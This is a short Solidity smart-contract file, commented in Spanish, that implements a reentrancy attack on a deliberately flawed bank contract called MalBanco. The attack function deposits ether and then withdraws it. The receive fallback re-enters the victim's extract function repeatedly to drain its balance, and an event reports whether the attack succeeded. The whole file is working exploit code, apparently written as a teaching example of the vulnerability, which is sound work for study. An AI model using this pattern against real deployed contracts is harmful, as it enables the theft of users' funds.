//SPDX-License-Identifier: MIT 

pragma solidity 0.8.30;

import "contracts/MalBanco.sol";

//EJEMPLO DE ATAQUE AL BANCO MAL HECHO, ATAQUE DE REENTRADA.
contract AtaqueMalBanco{
    MalBanco private victim;
    uint private amount;

    event SuccessfullAttack(bool success);
    
    receive () external payable {
        uint victimBalance = address(victim).balance;
        bool has_funds = victimBalance >= msg. value ;

        if ( has_funds ) {
            try victim.extract(msg.value) {} catch {}
        }
    }

    function attack (address victim_) external payable {
        require (msg.value >= 1 wei );
        victim = MalBanco(victim_);
        uint init = address(this).balance;
        amount = msg.value;

        victim.deposit{ value : msg.value }();
        victim.extract(msg.value);

        uint end = address(this).balance ;
        emit SuccessfullAttack (end > init );
    }

}